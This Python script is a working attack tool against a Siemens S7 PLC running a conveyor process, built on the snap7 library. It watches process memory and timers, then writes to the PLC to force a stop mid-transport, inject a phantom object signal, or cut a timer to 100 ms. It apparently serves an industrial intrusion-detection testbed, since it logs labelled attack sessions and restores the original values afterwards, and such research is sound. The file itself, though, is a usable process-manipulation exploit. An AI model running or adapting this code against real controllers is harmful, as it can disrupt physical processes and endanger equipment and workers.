"""
LOGIC_AWARE_ATTACK
Process-aware: doc logic PLC -> quyet dinh tan cong thong minh.
Chi STOP khi CD timer dang chay (co vat dang di).
Chi inject phantom object khi Vat_1 active.

Goi tu bash:
  python -m attacks_ext.logic_aware \
      --target 192.168.210.211 --rack 0 --slot 1 --duration 120 \
      --session-id bt_s1 --host-id attacker_host \
      --label-file labels/day7_timeline.csv
"""

import time
import struct
from attacks_ext.config_ext import base_parser, write_label

try:
    from snap7.type import Areas
except ImportError:
    from snap7.types import Areas
from snap7.util import get_bool, set_bool, get_dint, set_dint


def read_state(client):
    m5 = client.read_area(Areas.MK, 0, 5, 2)
    return {
        "START": get_bool(m5, 0, 0),
        "STOP": get_bool(m5, 0, 1),
        "Vat_1": get_bool(m5, 0, 4),
        "Vat_2": get_bool(m5, 0, 6),
        "Vat_3": get_bool(m5, 1, 0),
        "CD1": get_dint(client.read_area(Areas.MK, 0, 54, 4), 0),
        "CD2": get_dint(client.read_area(Areas.MK, 0, 58, 4), 0),
    }


def decide_attack(state):
    attacks = []
    if state["CD1"] > 0 and state["CD1"] < 30000:
        attacks.append(("STOP_DURING_TRANSPORT", f"CD1={state['CD1']}ms"))
    if state["Vat_1"] and not state["STOP"]:
        attacks.append(("INJECT_PHANTOM", "Vat_1=1 -> flip Vat_2"))
    if state["CD2"] > 3000:
        attacks.append(("TIMER_SHOCK", f"CD2={state['CD2']}->100ms"))
    return attacks


def execute(client, name):
    if name.startswith("STOP"):
        m5 = client.read_area(Areas.MK, 0, 5, 1)
        set_bool(m5, 0, 1, True)
        set_bool(m5, 0, 0, False)
        client.write_area(Areas.MK, 0, 5, m5)
        return "STOP+START reset"
    elif name.startswith("INJECT"):
        m5 = client.read_area(Areas.MK, 0, 5, 1)
        set_bool(m5, 0, 6, True)
        client.write_area(Areas.MK, 0, 5, m5)
        return "Vat_2=1"
    elif name.startswith("TIMER"):
        buf = bytearray(4)
        set_dint(buf, 0, 100)
        client.write_area(Areas.MK, 0, 58, buf)
        return "CD2=100ms"
    return "done"


def run(args):
    label_prefix = "LOGIC_AWARE"
    write_label(args.label_file, label_prefix, "START",
                args.session_id, args.host_id,
                episode_id=args.episode_id, day=args.day,
                note=f"dur={args.duration}s")

    import snap7
    client = snap7.client.Client()
    attack_count = 0
    original = None  # captured once connected; guards the restore in finally

    try:
        client.connect(args.target, args.rack, args.slot)
        print(f"[+] Connected. Monitoring + logic-aware attack...")

        m5_orig = client.read_area(Areas.MK, 0, 5, 2)
        original = {
            "START": get_bool(m5_orig, 0, 0),
            "STOP": get_bool(m5_orig, 0, 1),
            "Vat_2": get_bool(m5_orig, 0, 6),
            "CD2": get_dint(client.read_area(Areas.MK, 0, 58, 4), 0),
        }

        end_time = time.time() + args.duration
        while time.time() < end_time:
            state = read_state(client)
            attacks = decide_attack(state)
            if attacks:
                name, reason = attacks[0]
                result = execute(client, name)
                attack_count += 1
                print(f"  [{attack_count}] {name} ({reason}) -> {result}")
            time.sleep(3)

    except Exception as e:
        print(f"[ERR] {e}")
    finally:
        # execute() can leave START/STOP/Vat_2/CD2 modified (STOP_DURING_
        # TRANSPORT, INJECT_PHANTOM, TIMER_SHOCK); restore them here so a
        # mid-loop exception -- or just reaching --duration -- doesn't leave
        # the conveyor stuck stopped / the timer shocked. Unconditional
        # write-back of the pre-attack snapshot is a no-op for any field
        # execute() never touched.
        if original is not None and client.get_connected():
            try:
                m5 = client.read_area(Areas.MK, 0, 5, 1)
                set_bool(m5, 0, 0, original["START"])
                set_bool(m5, 0, 1, original["STOP"])
                set_bool(m5, 0, 6, original["Vat_2"])
                client.write_area(Areas.MK, 0, 5, m5)
                buf = bytearray(4)
                set_dint(buf, 0, original["CD2"])
                client.write_area(Areas.MK, 0, 58, buf)
                print(f"[*] Restored START={original['START']} STOP={original['STOP']} "
                      f"Vat_2={original['Vat_2']} CD2={original['CD2']}")
            except Exception as e:
                print(f"[ERR] Restore thất bại, cần khôi phục thủ công: {e}")
        if client.get_connected():
            client.disconnect()
        write_label(args.label_file, label_prefix, "END",
                    args.session_id, args.host_id,
                    episode_id=args.episode_id, day=args.day,
                    note=f"attacks={attack_count} original={original}")


def main():
    p = base_parser("Logic-Aware Process Attack")
    p.add_argument("--target", default="192.168.210.211")
    p.add_argument("--rack", type=int, default=0)
    p.add_argument("--slot", type=int, default=1)
    args = p.parse_args()
    run(args)


if __name__ == "__main__":
    main()
